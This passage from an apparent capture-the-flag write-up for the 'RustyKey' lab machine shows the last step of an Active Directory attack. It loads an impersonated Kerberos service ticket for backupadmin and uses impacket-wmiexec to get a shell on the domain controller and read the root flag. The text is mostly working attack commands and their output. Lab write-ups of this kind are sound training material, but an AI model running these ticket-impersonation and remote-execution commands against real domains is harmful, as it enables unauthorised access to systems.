❯ export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache

❯ klist
Ticket cache: FILE:backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
Default principal: backupadmin@RUSTYKEY.HTB

Valid starting       Expires              Service principal
06/29/2025 23:13:22  06/30/2025 08:12:04  cifs/DC.rustykey.htb@RUSTYKEY.HTB
	renew until 06/30/2025 22:09:04
```

Now we can log in using `wmiexec` with the impersonated ticket and retrieve the root flag:

```bash
❯ impacket-wmiexec -k -no-pass 'RUSTYKEY.HTB/backupadmin@dc.rustykey.htb'                                                        
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>type Users\Administrator\Desktop\root.txt
<REDACTED>
```